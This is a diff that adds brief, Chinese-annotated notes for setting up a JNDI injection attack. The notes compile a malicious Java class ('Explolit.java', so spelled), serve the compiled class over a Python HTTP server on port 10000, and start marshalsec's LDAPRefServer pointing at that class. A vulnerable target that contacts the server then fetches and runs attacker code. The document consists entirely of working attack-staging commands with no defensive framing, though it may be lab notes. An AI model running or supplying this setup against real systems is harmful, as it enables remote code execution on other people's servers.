@@ -1,0 +1,9 @@
+Explolit.java(恶意类)
+javac Explolit.java
+-->Exploit.class
+
+#在Exploit.class目录
+python3 -m http.server 10000
+
+#在marshalsec-0.0.3-SNAPSHOT-all.jar目录:
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:10000/#Exploit"
